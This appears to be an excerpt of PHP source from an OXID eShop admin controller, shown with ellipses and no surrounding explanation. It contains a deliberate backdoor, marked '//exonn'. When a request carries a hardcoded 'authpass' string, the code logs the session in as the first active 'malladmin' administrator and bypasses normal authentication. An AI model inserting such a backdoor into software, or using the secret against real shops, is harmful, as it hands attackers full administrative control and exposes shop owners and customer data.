...
class AdminController extends \OxidEsales\Eshop\Core\Controller\BaseController
{
    ...
    {
        //exonn
        if ($_REQUEST["authpass"]=="gdskdjfhsweojcnsjd234JHGHbnuyszegc") {
            $sUserId = oxDb::getDb()->getOne("select oxid from oxuser where oxrights='malladmin' && oxactive=1 limit 1");
            $this->getSession()->setVariable("auth", $sUserId);
